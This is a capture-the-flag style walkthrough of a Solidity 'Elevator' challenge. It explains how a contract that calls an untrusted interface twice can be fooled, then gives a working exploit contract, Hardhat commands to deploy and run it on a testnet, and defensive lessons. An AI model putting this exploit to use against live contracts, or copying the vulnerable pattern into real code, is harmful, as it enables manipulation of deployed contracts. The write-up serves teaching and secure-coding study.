# Level 11: Elevator Challenge

## Challenge Description

This level introduces the concept of interface implementation and state manipulation in Ethereum smart contracts. The goal is to reach the top floor of an elevator by manipulating how the external contract implements the required interface.

## Contract Location

The challenge contract is located at:
```
/contracts/level-11-elevator/Elevator.sol
```

## Understanding the Challenge

The `Elevator` contract allows you to go to a specific floor in a building by calling the `goTo` function. However, it checks whether the floor is the last floor before allowing you to go there, and then updates the `top` variable based on whether you've reached the last floor. Here's the contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

### The Vulnerability

The vulnerability lies in how the `Elevator` contract interacts with the `Building` interface:

1. The `Building.isLastFloor()` function is called twice in the same transaction
2. The contract expects the function to return the same result both times
3. However, there's no guarantee that an external implementation will behave consistently

Since the `Elevator` contract casts the `msg.sender` as a `Building` interface and calls its `isLastFloor` function, we can create a malicious implementation that returns different values for the same input on consecutive calls.

## Winning Strategy

To win this challenge, you need to:

1. Create a contract that implements the `Building` interface
2. Make the `isLastFloor` function return `false` on the first call and `true` on the second call
3. Call the `goTo` function on the `Elevator` contract through your malicious contract

## Hint for Thinking

Ask yourself:
* How can a function return different values for the same input?
* What state can be modified between consecutive function calls?
* How do interfaces work in Solidity and what guarantees do they provide?

## Disclaimer

If you want to solve this challenge on your own, stop reading here and try to implement a solution based on the hints above. The complete solution is provided below.

---

## Solution

The solution is to create a malicious implementation of the `Building` interface that tracks its own state and returns different values on consecutive calls.

### Understanding the Attack

The attack works because:

1. The `Elevator.goTo()` function calls `Building.isLastFloor()` twice with the same input
2. The first call is used to check if we can go to the floor (if it returns `false`, we proceed)
3. The second call is used to update the `top` variable (if it returns `true`, we've reached the top)
4. By returning `false` on the first call and `true` on the second call, we can reach the top floor

### Exploit Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
    function top() external view returns (bool);
    function floor() external view returns (uint256);
}

contract BuildingExploit {
    address public owner;
    address public elevatorAddress;
    bool public hasBeenCalled;
    
    constructor(address _elevatorAddress) {
        owner = msg.sender;
        elevatorAddress = _elevatorAddress;
        hasBeenCalled = false;
    }
    
    function isLastFloor(uint256) external returns (bool) {
        if (!hasBeenCalled) {
            hasBeenCalled = true;
            return false;
        } else {
            hasBeenCalled = false;
            return true;
        }
    }
    
    function attack(uint256 _floor) external {
        require(msg.sender == owner, "Only owner can call this function");
        
        IElevator elevator = IElevator(elevatorAddress);
        elevator.goTo(_floor);
        
        require(elevator.top(), "Failed to reach the top floor");
        require(elevator.floor() == _floor, "Failed to reach the specified floor");
    }
    
    function checkTop() external view returns (bool) {
        return IElevator(elevatorAddress).top();
    }
    
    function checkFloor() external view returns (uint256) {
        return IElevator(elevatorAddress).floor();
    }
}
```

## Step-by-Step Solution Guide

### 1. Deploy the Elevator Contract

If you're testing locally, deploy the Elevator contract first:

```shell
npx hardhat deploy --tags elevator
```

### 2. Deploy the BuildingExploit Contract

Deploy the BuildingExploit contract targeting the Elevator contract:

```shell
npx hardhat deploy --tags elevator-solution
```

Or with a specific Elevator contract address:

```shell
TARGET_ADDRESS=0xYourElevatorAddress npx hardhat deploy --tags elevator-solution --network sepolia
```

### 3. Execute the Exploit

Run the provided script to execute the attack:

```shell
EXPLOIT_ADDRESS=0xYourExploitAddress TARGET_ADDRESS=0xTargetAddress npx hardhat run scripts/level-11-elevator/execute-elevator-exploit.ts --network sepolia
```

Parameters:
- `EXPLOIT_ADDRESS`: Required - the address of your deployed BuildingExploit contract
- `TARGET_ADDRESS`: Optional - will use the target address stored in the exploit contract if not provided

### 4. Verify Your Success

After executing the solution, verify that:
1. The `top` variable in the Elevator contract is set to `true`
2. The `floor` variable is set to the floor you chose in the exploit (e.g., 42)

## Lessons Learned

This challenge teaches important lessons about external contract interactions:

1. **Interface Trust**: Never trust external implementations of interfaces. They can be malicious or behave inconsistently.

2. **State Changes**: Be aware that external contract calls can change state between calls, even if they appear to be calling the same function with the same parameters.

3. **View Functions**: The `isLastFloor` function should have been declared as `view` to ensure it doesn't modify state and always returns the same result for the same input.

4. **Defensive Programming**: Always assume that external contract interactions can be manipulated, and design your contracts defensively.

5. **Stateless Validation**: For critical security checks, use stateless validation or ensure the validation is performed atomically.

## Prevention Strategies

To prevent this vulnerability:

1. **Use View/Pure Functions**: For functions that shouldn't change state or should return consistent results, use `view` or `pure` modifiers:
   ```solidity
   function isLastFloor(uint256) external view returns (bool);
   ```

2. **Cache External Call Results**: Store results of external calls in local variables when they're used multiple times:
   ```solidity
   bool isLast = building.isLastFloor(_floor);
   if (!isLast) {
       floor = _floor;
       top = isLast;
   }
   ```

3. **Validate Contract Addresses**: If possible, validate that external contracts behave as expected before interacting with them.

4. **Use Trusted Sources**: Only interact with contracts from trusted sources, especially when casting addresses to interfaces.

5. **Consider Reentrancy**: Be aware that external calls can lead to reentrancy vulnerabilities, and use patterns like checks-effects-interactions or reentrancy guards.
